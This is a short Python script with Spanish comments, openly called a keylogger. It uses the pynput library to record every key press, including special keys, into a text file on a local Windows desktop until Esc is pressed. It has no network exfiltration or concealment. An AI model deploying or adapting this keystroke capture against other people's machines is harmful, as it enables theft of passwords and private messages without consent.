from pynput import keyboard
import logging
import time
from datetime import datetime

# Ruta del archivo donde se guardará la información registrada por el keylogger
carpeta_destino = 'C:\\Users\\julian\\Desktop\\keylogger\\keylogger.txt'

# Configuración del logging
logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        # Registrar teclas normales
        logging.info(f'{key.char}')
    except AttributeError:
        # Registrar teclas especiales
        logging.info(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Detener el listener al presionar la tecla Esc
        return False

# Iniciar el listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
